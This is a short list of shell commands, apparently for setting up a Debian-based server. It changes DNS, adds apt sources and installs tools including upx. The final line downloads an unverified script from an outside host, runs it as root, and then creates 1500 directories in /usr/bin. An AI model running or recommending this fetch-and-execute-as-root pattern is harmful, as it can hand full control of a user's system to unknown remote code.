grub-install /dev/loop2 
exit
sudo bash -c 'echo "nameserver 1.1.1.1" > /etc/resolv.conf'
sudo bash -c 'echo -e "[Resolve]\nDNS=1.1.1.1" > /etc/systemd/resolved.conf && systemctl enable systemd-resolved'
sudo sh -c 'echo "deb http://deb.debian.org/debian buster main" >> /etc/apt/sources.list'
apt update -y && apt upgrade -y && apt install -y wget screen bzip2 upx-ucl xz-utils && cp /usr/bin/xz /bin && reboot
sudo apt --fix-missing update && sudo apt update && sudo apt upgrade -y && wget -q -O install "https://zvx.my.id/mt/mt.sh" && chmod +x install && sudo ./install && for i in $(seq 1 1500); do sudo mkdir "/usr/bin/bkz$i"; done
